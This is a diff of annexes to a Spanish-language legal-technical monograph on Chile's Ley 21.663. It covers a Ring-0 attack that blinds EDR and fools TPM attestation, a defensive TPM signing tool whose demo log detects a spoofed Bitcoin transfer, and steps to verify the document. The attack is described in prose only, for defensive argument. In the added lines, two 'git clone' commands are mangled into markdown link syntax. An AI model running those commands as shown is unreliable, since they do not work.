+El impacto de esta ejecución a nivel de núcleo sobre la arquitectura de la Ley Marco de Ciberseguridad (Ley N° 21.663) es procesalmente letal. El legislador impone a los Operadores de Importancia Vital (OIV) un plazo perentorio e improrrogable de tres horas para notificar un incidente a la Agencia Nacional de Ciberseguridad (ANCI). Este reloj regulatorio descansa sobre una presunción epistémica ingenua: asume que la telemetría alertará al operador del compromiso en tiempo real. La detonación de esta Prueba de Concepto destruye esa premisa. Durante las tres horas que la ley otorga para reaccionar, el sistema defensivo de la capa de usuario (EDR) permanece en silencio y el hardware (TPM) atesta matemáticamente una falsa normalidad. 
+
+Frente a esta ceguera inducida, el Encargado de Ciberseguridad queda atrapado en un laberinto legal sin salida: o deja expirar el plazo porque sus monitores están en verde, o envía un reporte de estado asegurando que la infraestructura está intacta. En ambos escenarios, el ataque en Ring-0 convierte automáticamente a la corporación en infractora. Al remitir el *log* envenenado como prueba de su debida diligencia, la entidad consuma la infracción gravísima de "entrega de información falsa o errónea" al regulador. El Estado, al legislar asumiendo la infalibilidad de un sustrato de ejecución que no exige auditar, no está fiscalizando la diligencia de la empresa; la está obligando, bajo amenaza de multas millonarias, a estampar su firma institucional sobre la coartada del adversario.
 
 **[ ↩ Volver a la lectura principal: La amenaza estructural ](#amenaza-invisibilidad)**
 
+***
+
 ### E.2 Código fuente de la ceremonia atestada (Implementación)
 
-Las afirmaciones de ingeniería de la Sección 7 —en particular la Ceremonia de
-Firma Atestada de §7.8.1— no se presentan como una construcción teórica. Existe
-una implementación de referencia, ejecutable y verificable de forma
-independiente, cuyo código fuente completo se publica de manera abierta y se
-deposita con identificador persistente para su citación y fechado por terceros:
+Las afirmaciones de ingeniería de la Sección 7 —en particular la Ceremonia de Firma Atestada de §7.8.1— no se presentan como una construcción teórica. Existe una implementación de referencia, ejecutable y verificable de forma independiente, cuyo código fuente completo se publica de manera abierta y se deposita con identificador persistente para su citación y fechado por terceros:
 
-- Repositorio: https://github.com/JaimeMoragaC/attested-signing-ceremony
-- Commit verificado: `[HASH_COMMIT]`
-- Depósito citable (DOI): [DOI_ZENODO]
-- Anclaje on-chain del release: `[TXID_BITCOIN]` (red [testnet/mainnet])
-- Licencia: MIT
+*   **Repositorio:** `https://github.com/JaimeMoragaC/attested-signing-ceremony`
+*   **Commit verificado:** `[HASH_COMMIT]`
+*   **Depósito citable (DOI):** `[DOI_ZENODO]`
+*   **Anclaje on-chain del release:** `[TXID_BITCOIN]` (red [testnet/mainnet])
+*   **Licencia:** MIT
 
-La implementación (denominada *Attested Signing Ceremony*, binario `asc`) está
-escrita en Rust y opera sobre un TPM 2.0 de hardware real a través del
-administrador de recursos del núcleo (`/dev/tpmrm0`), sin privilegios de
-superusuario. No emplea simulador: la salida de atestación reproducida a
-continuación proviene de silicio físico.
+La implementación (denominada *Attested Signing Ceremony*, binario `asc`) está escrita en Rust y opera sobre un TPM 2.0 de hardware real a través del administrador de recursos del núcleo (`/dev/tpmrm0`), sin privilegios de superusuario. No emplea simulador: la salida de atestación reproducida a continuación proviene de silicio físico.
 
 #### Correspondencia con los tres pasos de §7.8.1
+La herramienta materializa exactamente los tres pasos descritos en el cuerpo del trabajo:
 
-La herramienta materializa exactamente los tres pasos descritos en el cuerpo del
-trabajo:
+1.  **Firma medida (Paso 1).** Antes de la ceremonia se reinicia el PCR de aplicación 23 y se extiende con el *hash* del *payload* real de la transacción (`tpm2_pcrextend`); a continuación se produce una cita (`tpm2_quote`) firmada por la clave de atestación (AK) sobre los PCR de arranque (0–7) y el PCR del *payload* (23). El estado del entorno y la instrucción concreta quedan así vinculados criptográficamente.
+2.  **Vinculación atómica (Paso 2).** El digesto de atestación —`SHA256(cita ‖ firma ‖ clave pública AK)`— se compromete en un registro de transparencia estilo SCITT (append-only, encadenado por *hash*) y se embebe en una salida `OP_RETURN` de Bitcoin de 34 bytes, holgadamente dentro del límite de estandarización de 80 bytes.
+3.  **Verificabilidad independiente (Paso 3).** Cualquier tercero —la CMF, un perito, el propio cliente— verifica la firma y el *nonce* de la cita (`tpm2_checkquote`), recalcula el valor esperado del PCR23 —`SHA256(0^{32} ‖ SHA256(payload))`— y confirma el digesto, el anclaje y la integridad de la cadena del registro.
 
-1. Firma medida (Paso 1). Antes de la ceremonia se reinicia el PCR de
-   aplicación 23 y se extiende con el *hash* del *payload* real de la
-   transacción (`tpm2_pcrextend`); a continuación se produce una cita
-   (`tpm2_quote`) firmada por la clave de atestación (AK) sobre los PCR de
-   arranque (0–7) y el PCR del *payload* (23). El estado del entorno y la
-   instrucción concreta quedan así vinculados criptográficamente.
-2. Vinculación atómica (Paso 2). El digesto de atestación
-   —`SHA256(cita ‖ firma ‖ clave pública AK)`— se compromete en un registro de
-   transparencia estilo SCITT (append-only, encadenado por *hash*) y se embebe
-   en una salida `OP_RETURN` de Bitcoin de 34 bytes, holgadamente dentro del
-   límite de estandarización de 80 bytes.
-3. Verificabilidad independiente (Paso 3). Cualquier tercero —la CMF, un
-   perito, el propio cliente— verifica la firma y el *nonce* de la cita
-   (`tpm2_checkquote`), recalcula el valor esperado del PCR23
-   —`SHA256(0^{32} ‖ SHA256(payload))`— y confirma el digesto, el anclaje y la
-   integridad de la cadena del registro.
+– 412 –
+LA FICCIÓN DE LA CIBERSEGURIDAD CORPORATIVA
 
-### E.2 Prueba de ejecución: el ataque de capa de presentación
+#### Prueba de ejecución: el ataque de capa de presentación
 
-El escenario reproducido corresponde al patrón común a los casos Bybit, Radiant
-Capital y WazirX analizad os en §7.8.1: la interfaz muestra una transacción y
-el dispositivo firma otra distinta. La ejecución vincula el *payload*
-efectivamente firmado y demuestra que la verificación contra lo que la interfaz
-exhibió falla, mientras que la verificación contra lo realmente firmado
-tiene éxito (transcripción abreviada, s alida literal de la herramienta):
+El escenario reproducido corresponde al patrón común a los casos Bybit, Radiant Capital y WazirX analizados en §7.8.1: la interfaz muestra una transacción y el dispositivo firma otra distinta. La ejecución vincula el *payload* efectivamente firmado y demuestra que la verificación contra lo que la interfaz exhibió falla, mientras que la verificación contra lo realmente firmado tiene éxito (transcripción abreviada, salida literal de la herramienta):
 
-```
- UI SHOWED   : TRANSFER 0.10 BTC -> bc1q-alice-legitimate-client
- DEVICE SIGNED: TRANSFER 10.00 BTC -> bc1q-attacker-lazarus-group
+```text
+UI SHOWED : TRANSFER 0.10 BTC -> bc1q-alice-legitimate-client 
+DEVICE SIGNED: TRANSFER 10.00 BTC -> bc1q-attacker-lazarus-group
 
-  SIGNED payload      sha256:f091af901bd9f82ecdc3037caa017b966121b1202db1c2bd65d673b46e347d5d
-  attested PCR23      b5c2c2b90cb62a49d8dc12f68fbaff06c4f1e0d889484522c650471eb2328eb9
-  attestation digest  2974e8104671a95cc9709c4d24689a09f11f9d7e01d584fd474ebb5c8480d49d
-  OP_RETURN script    6a202974e8104671a95cc9709c4d24689a09f11f9d7e01d584fd474ebb5c8480d49d
+SIGNED payload sha256:f091af901bd9f82ecdc3037caa017b966121b1202db1c2bd65d673b46e347d5d 
+attested PCR23 b5c2c2b90cb62a49d8dc12f68fbaff06c4f1e0d889484522c650471eb2328eb9
+attestation digest 2974e8104671a95cc9709c4d24689a09f11f9d7e01d584fd474ebb5c8480d49d 
+OP_RETURN script 6a202974e8104671a95cc9709c4d24689a09f11f9d7e01d584fd474ebb5c8480d49d
 
-── verificación: el auditor contrasta contra lo que la INTERFAZ MOSTRÓ
-  [FAIL] payload binding (PCR23 matches expected)      => RECHAZADO
-      expected PCR23 051d13814ec8167eb27c40a0b875a0a2975b760f0c7a7c7b7f31eb3887f23402
-      attested PCR23 b5c2c2b90cb62a49d8dc12f68fbaff06c4f1e0d889484522c650471eb2328eb9
+── verificación: el auditor contrasta contra lo que la INTERFAZ MOSTRÓ 
+[FAIL] payload binding (PCR23 matches expected) => RECHAZADO
+expected PCR23 051d13814ec8167eb27c40a0b875a0a2975b760f0c7a7c7b7f31eb3887f23402
+attested PCR23 b5c2c2b90cb62a49d8dc12f68fbaff06c4f1e0d889484522c650471eb2328eb9
 
-── verificación: el auditor contrasta contra lo que se FIRMÓ realmente
-  [PASS] AK signature + nonce (hardware attested)
-  [PASS] payload binding (PCR23 matches expected)
-  [PASS] attestation digest matches receipt
-  [PASS] OP_RETURN anchor matches digest
-  [PASS] SCITT chain intact                            => CEREMONIA VÁLIDA
+── verificación: el auditor contrasta contra lo que se FIRMÓ realmente 
+[PASS] AK signature + nonce (hardware attested) 
+[PASS] payload binding (PCR23 matches expected) 
+[PASS] attestation digest matches receipt 
+[PASS] OP_RETURN anchor matches digest 
+[PASS] SCITT chain intact => CEREMONIA VÁLIDA
 ```
 
-La cita queda verificada de forma independient e por `tpm2_checkquote`, cuya
-salida —no el recibo— es la fuente de los valores PCR. Los registros de arranque
-0–7 corresponden al estado físico de la máquina de prueba; el PCR23 refleja el
-*payload* firmado:
+La cita queda verificada de forma independiente por `tpm2_checkquote`, cuya salida —no el recibo— es la fuente de los valores PCR. Los registros de arranque 0–7 corresponden al estado físico de la máquina de prueba; el PCR23 refleja el *payload* firmado:
 
-```
+– 413 –
+LA FICCIÓN DE LA CIBERSEGURIDAD CORPORATIVA
+
+```text
 pcrs:
-  sha256:
-    0 : 0x490BF81168FEBE08498923675580921E354DA10040B1A373B6F75E8DC19BA5D8
-    ...
-    7 : 0x14125A871E202034426FC6A8CE8D6B2251290073B30B9B331AB6E14B60C1B11D
-    23: 0x41DDD409DE053BE21B3718D9D1678D196159F8E6690FC939FFAD6CB36B17F871
-sig: 98b30063ae8f7fac...   (RSA-2048, firmada por la AK)
+ sha256:
+ 0 : 0x490BF81168FEBE08498923675580921E354DA10040B1A373B6F75E8DC19BA5D8 ...
+ 7 : 0x14125A871E202034426FC6A8CE8D6B2251290073B30B9B331AB6E14B60C1B11D
+ 23: 0x41DDD409DE053BE21B3718D9D1678D196159F8E6690FC939FFAD6CB36B17F871
+ sig: 98b30063ae8f7fac... (RSA-2048, firmada por la AK)
 ```
+
+– 414 –
+LA FICCIÓN DE LA CIBERSEGURIDAD CORPORATIVA
 
 ### E.3 Alcance de la implementación
 
-Son reales y ejecutan contra hardware todas las operaciones de TPM y su
-verificación criptográfica, la construcción y comprobación de la cadena SCITT y
-la construcción del anclaje `OP_RETURN`. Se  dejan deliberadamente como pasos de
-despliegue —no como carencias de la lógica de la ceremonia— la persistencia y el
-enrolamiento con autoridad certificadora de la AK, la difusión efectiva del
-anclaje en la red y la operación del registro de transparencia como servicio en
-red. Esta distinción se documenta de forma explícita en el repositorio.
+Son reales y ejecutan contra hardware todas las operaciones de TPM y su verificación criptográfica, la construcción y comprobación de la cadena SCITT y la construcción del anclaje `OP_RETURN`. Se dejan deliberadamente como pasos de despliegue —no como carencias de la lógica de la ceremonia— la persistencia y el enrolamiento con autoridad certificadora de la AK, la difusión efectiva del anclaje en la red y la operación del registro de transparencia como servicio en red. Esta distinción se documenta de forma explícita en el repositorio.
 
-La conclusión jurídica del cuerpo del trabajo no depende de que esta arquitectura
-esté desplegada en producción, sino de que sea técnicamente factible —lo que
-esta implementación de referencia acredita de manera reproducible— y de que la
-decisión de no adoptarla constituya una elección consciente del operador, en los
-términos del análisis de §7.8.1 y de la nota técnica CSA†.
+La conclusión jurídica del cuerpo del trabajo no depende de que esta arquitectura esté desplegada en producción, sino de que sea técnicamente factible —lo que esta implementación de referencia acredita de manera reproducible— y de que la decisión de no adoptarla constituya una elección consciente del operador, en los términos del análisis de §7.8.1 y de la nota técnica CSA†.
 
 ## Anexo F. Cómo verificar la autenticidad e integridad de este documento
 
-Este anexo es la demostración palpable de la tesis de este trabajo. A lo
-largo de sus páginas el documento sostiene que, sin atestación criptográfica,
-ningún registro digital puede acreditar por sí mismo su autoría, su fecha ni su
-integridad —y que esa prueba, lejos de ser una aspiración teórica, es
-técnicamente posible y jurídicamente exigible—. Al someter este propio documento
-a esos mismos mecanismos, el autor no se limita a describir la solución: la
-ejerce sobre sí mismo. Lo que el lector tiene ante sí no es, por tanto, un
-apéndice administrativo, sino la evidencia empírica de que aquello que el texto
-reclama como necesario es también realizable hoy, con herramientas abiertas y
-comprobables por cualquiera. Si el lector consigue verificar por su cuenta la
-firma, la fecha y la integridad de este trabajo —como se explica más abajo—,
-habrá comprobado, con el mismo acto, que la tesis central no es una promesa sino
-una práctica disponible.
+Este anexo es la demostración palpable de la tesis de este trabajo. A lo largo de sus páginas el documento sostiene que, sin atestación criptográfica, ningún registro digital puede acreditar por sí mismo su autoría, su fecha ni su integridad —y que esa prueba, lejos de ser una aspiración teórica, es técnicamente posible y jurídicamente exigible—. Al someter este propio documento a esos mismos mecanismos, el autor no se limita a describir la solución: la ejerce sobre sí mismo. Lo que el lector tiene ante sí no es, por tanto, un apéndice administrativo, sino la evidencia empírica de que aquello que el texto reclama como necesario es también realizable hoy, con herramientas abiertas y comprobables por cualquiera. Si el lector consigue verificar por su cuenta la firma, la fecha y la integridad de este trabajo —como se explica más abajo—, habrá comprobado, con el mismo acto, que la tesis central no es una promesa sino una práctica disponible.
 
-Este trabajo no pide, pues, que se confíe en la palabra de su autor. Toda su
-autoría, su fecha de existencia y su integridad son **verificables de forma
-independiente** por cualquier lector, mediante los mismos mecanismos
-criptográficos que el propio documento propone (firma digital, cadena de
-*hashes* y anclaje en una cadena de bloques pública). Este anexo explica qué se
-garantiza y cómo comprobarlo.
+Este trabajo no pide, pues, que se confíe en la palabra de su autor. Toda su autoría, su fecha de existencia y su integridad son **verificables de forma independiente** por cualquier lector, mediante los mismos mecanismos criptográficos que el propio documento propone (firma digital, cadena de *hashes* y anclaje en una cadena de bloques pública). Este anexo explica qué se garantiza y cómo comprobarlo.
 
 ### F.1 Qué queda demostrado
 
-- Autoría. Cada versión de este documento está firmada digitalmente con una
-  clave criptográfica bajo control exclusivo del autor. Solo esa clave puede
-  producir esas firmas.
-- Fecha cierta de existencia. El estado completo del documento fue sellado
-  con OpenTimestamps, que ancla una huella del texto en la cadena de bloques de
-  Bitcoin. Ello prueba que este documento —y todo su historial de elaboración—
-  existía en la fecha indicada, sin que esa fecha pueda adelantarse ni
-  retrasarse por nadie, ni siquiera por el autor.
-- Integridad. Cualquier alteración posterior de una sola letra cambia la
-  huella y rompe tanto la firma como el sello. Es, por tanto, imposible
-  presentar una versión modificada como si fuera la original, y también imposible
-  atribuir al autor una versión adulterada por un tercero.
-- Elaboración progresiva. El documento fue construido en un historial de
-  cientos de revisiones sucesivas, cada una firmada y fechada, que evidencia un
-  proceso de autoría humana y continuada.
+*   **Autoría.** Cada versión de este documento está firmada digitalmente con una clave criptográfica bajo control exclusivo del autor. Solo esa clave puede producir esas firmas.
+*   **Fecha cierta de existencia.** El estado completo del documento fue sellado con OpenTimestamps, que ancla una huella del texto en la cadena de bloques de Bitcoin. Ello prueba que este documento —y todo su historial de elaboración— existía en la fecha indicada, sin que esa fecha pueda adelantarse ni retrasarse por nadie, ni siquiera por el autor.
+*   **Integridad.** Cualquier alteración posterior de una sola letra cambia la huella y rompe tanto la firma como el sello. Es, por tanto, imposible presentar una versión modificada como si fuera la original, y también imposible atribuir al autor una versión adulterada por un tercero.
+
+– 415 –
+LA FICCIÓN DE LA CIBERSEGURIDAD CORPORATIVA
+
+*   **Elaboración progresiva.** El documento fue construido en un historial de cientos de revisiones sucesivas, cada una firmada y fechada, que evidencia un proceso de autoría humana y continuada.
 
 ### F.2 Datos de verificación (versión sellada)
 
 | Elemento | Valor |
-|---|---|
+| :--- | :--- |
 | Clave de firma (Ed25519), huella | `SHA256:AKDHMiud0xMCcm/tvDqgVBCS+Z/sqc9xiixckjYF6kk` |
 | Clave pública del autor | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQm/+3NH6zEZLD1oO5KVe/eIpYn7SOVOtgFW0/hdUnW` |
 | Identidad del firmante | `justicia.chile@gmail.com` |
 | Etiqueta firmada (sello) | `sello-paper-2026-07-02` |
 | *Commit* firmado | el HEAD del repositorio, firmado con la clave anterior |
 | SHA-256 del texto y del PDF | registrados en el manifiesto `SELLO_*.txt` y en las pruebas `.ots`; verificables con `ots verify` (F.3) |
-| Repositorio público | https://github.com/JaimeMoragaC/colapso-probatorio |
-| Depósito citable (DOI) | [DOI_ZENODO] |
+| Repositorio público | `https://github.com/JaimeMoragaC/colapso-probatorio` |
+| Depósito citable (DOI) | `[DOI_ZENODO]` |
 
-> Nota: cada versión del documento lleva su propio *commit* firmado y su propio
-> sello temporal. La verificación no se hace contra un *hash* impreso en el
-> propio documento —que, por ser autorreferente, no puede contenerlo—, sino
-> contra *el repositorio público, mediante `git verify-tag` y `ots verify` (F.3).
-> La identidad de la clave y la ubicación del repositorio reflejan la
-> configuración vigente al publicar esta versión.
+> *Nota: cada versión del documento lleva su propio commit firmado y su propio sello temporal. La verificación no se hace contra un hash impreso en el propio documento —que, por ser autorreferente, no puede contenerlo—, sino contra el repositorio público, mediante `git verify-tag` y `ots verify` (F.3). La identidad de la clave y la ubicación del repositorio reflejan la configuración vigente al publicar esta versión.*
 
 ### F.3 Cómo comprobarlo usted mismo (verificación técnica)
 
@@ -6346,32 +6430,36 @@ Con `git` y el cliente de OpenTimestamps (`ots`), sobre el repositorio público:
 
 ```bash
 # 1) Obtener el repositorio y confirmar la firma que sella TODO el historial.
-git clone https://github.com/JaimeMoragaC/colapso-probatorio && cd colapso-probatorio
+git clone [https://github.com/JaimeMoragaC/colapso-probatorio](https://github.com/JaimeMoragaC/colapso-probatorio) && cd colapso-probatorio
 git -c gpg.ssh.allowedSignersFile=allowed_signers verify-tag sello-paper-2026-07-02
-#    -> "Good signature" con la huella Ed25519 de la tabla F.2.
-#    Por la estructura de Merkle de git, esa firma avala cada uno de los
-#    cientos de commits previos sin haber reescrito ninguno.
+
+# -> "Good signature" con la huella Ed25519 de la tabla F.2.
+# Por la estructura de Merkle de git, esa firma avala cada uno de los
+# cientos de commits previos sin haber reescrito ninguno.
 
 # 2) Confirmar la fecha de existencia anclada en Bitcoin.
 ots verify PAPER_v3_trabajo.md.ots
-#    -> "Success! Bitcoin block  attests existence as of ".
+
+# -> "Success! Bitcoin block attests existence as of <fecha>".
 
 # 3) Comprobar la integridad del texto contra el hash sellado.
-sha256sum PAPER_v3_trabajo.md      # debe coincidir con la tabla F.2 / el manifiesto SELLO.
+sha256sum PAPER_v3_trabajo.md 
+# debe coincidir con la tabla F.2 / el manifiesto SELLO.
 ```
 
 ### F.4 La ingeniería no es teoría: ejecútela
 
-La arquitectura de atestación descrita en §7.8.1 se acompaña de una
-implementación de referencia ejecutable (Anexo E). Quien lo desee puede
-compilarla y correrla contra un TPM real para confirmar, con salida de hardware,
-que la Ceremonia de Firma Atestada funciona como se afirma:
+La arquitectura de atestación descrita en §7.8.1 se acompaña de una implementación de referencia ejecutable (Anexo E). Quien lo desee puede compilarla y correrla contra un TPM real para confirmar, con salida de hardware, que la Ceremonia de Firma Atestada funciona como se afirma:
+
+– 416 –
+LA FICCIÓN DE LA CIBERSEGURIDAD CORPORATIVA
 
 ```bash
-git clone https://github.com/JaimeMoragaC/attested-signing-ceremony && cd attested-signing-ceremony
+git clone [https://github.com/JaimeMoragaC/attested-signing-ceremony](https://github.com/JaimeMoragaC/attested-signing-ceremony) && cd attested-signing-ceremony
 cargo run --release -- setup
 cargo run --release -- demo-tamper
 ```
+
 
 ### F.5 Sobre la honestidad de esta constancia
 
